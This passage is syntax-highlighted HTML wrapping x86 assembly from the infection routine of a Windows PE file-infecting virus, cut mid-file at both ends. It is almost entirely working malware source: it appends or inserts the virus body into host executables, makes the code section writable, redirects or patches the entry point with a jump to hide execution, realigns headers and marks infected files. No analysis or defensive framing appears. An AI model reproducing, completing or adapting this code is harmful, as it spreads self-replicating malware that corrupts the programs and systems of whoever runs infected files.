       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_INCREASE_LAST</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_increase_last</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_it</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_increase_last</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_APPEND_AT_END</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_at_end</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_it</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_at_end</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codedelta</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_it</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ourpoint</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourpoint</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;for imagebase getter</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;here is a raw ptr in the</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;last section. Substract</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;raw pointer and add virt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesource</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;pointer to get a RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;same crap on destination</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codedestin</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copying</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;syncronization</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;move virus now in the</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_virus_size</span><span class="sc0">                        </span><span class="sc1">;code place...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copying</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofentrypoint</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;save old eip</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldeip</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc4">+</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">                                </span><span class="sc1">;make code writable</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_method_1</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_APPEND_AT_END</span><span class="sc0">      </span><span class="sc1">;here we append the virus</span><span class="sc0">
                                                   </span><span class="sc1">;at the end...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_IsBadWritePtr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">   </span><span class="sc1">;can we write?</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_virus_movement</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_not</span><span class="sc0">                              </span><span class="sc1">;check lists</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">firstgen</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;zero the first gen mark</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;now align size of image</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofimage</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;to the section alignment</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newsize</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">totalsizes</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">sizeofimage_ok</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_sectionalign</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sizeofimage_ok</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;align the filesize to</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newsize</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;the file alignment</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_filealign</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_APPEND_AT_END</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">alternate</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_INCREASE_LAST</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">alternate2</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;get our final destination</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;substract current map</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_eip</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">alternate2</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EPO_Routine</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">set_epo</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_eip</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">alternate</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EPO_Routine</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">set_epo</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_eip</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_epo</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofentrypoint</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionraw</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionrva</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">saved_code</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mark_infection</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_eip</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;address and save eip RVA</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mark_infection</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">                               </span><span class="sc1">;get random pythagora's</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                              </span><span class="sc1">;numbers roots</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;m</span><span class="sc0">
